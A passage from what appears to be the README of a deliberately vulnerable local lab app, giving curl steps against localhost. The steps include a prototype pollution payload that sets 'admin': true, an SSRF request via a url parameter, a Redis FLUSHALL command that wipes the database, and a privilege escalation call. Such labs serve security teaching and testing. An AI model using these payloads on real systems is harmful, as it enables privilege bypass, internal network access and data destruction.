2. **Verifica iniziale dello stato:**
```bash
curl http://localhost:3000/check

#output atteso {}% 
```

3. **Attacco prototype pollution:**
```bash
curl -X POST http://localhost:3000/pollute \
  -H "Content-Type: application/json" \
  -d '{ "__proto__": { "admin": true } }'
```

4. **Verifica effetto:**
```bash
curl http://localhost:3000/check

#output atteso {"admin":true}%     
```

5. **SSRF*
```bash
curl "http://localhost:3000/ssrf?url=http://example.com"
```

6. **Redis, distribuzione task**
```bash
curl -X POST http://localhost:3000/task \
-H 'Content-Type: application/json' \
-d '{"command": "PING", "args": []}'
```
or
```bash
curl -X POST http://localhost:3000/task \
-H 'Content-Type: application/json' \
-d '{"command": "FLUSHALL", "args": []}'
#this one deletes the db
```

7. **Privilege escalation**
```bash
curl http://localhost:3000/escalate
```
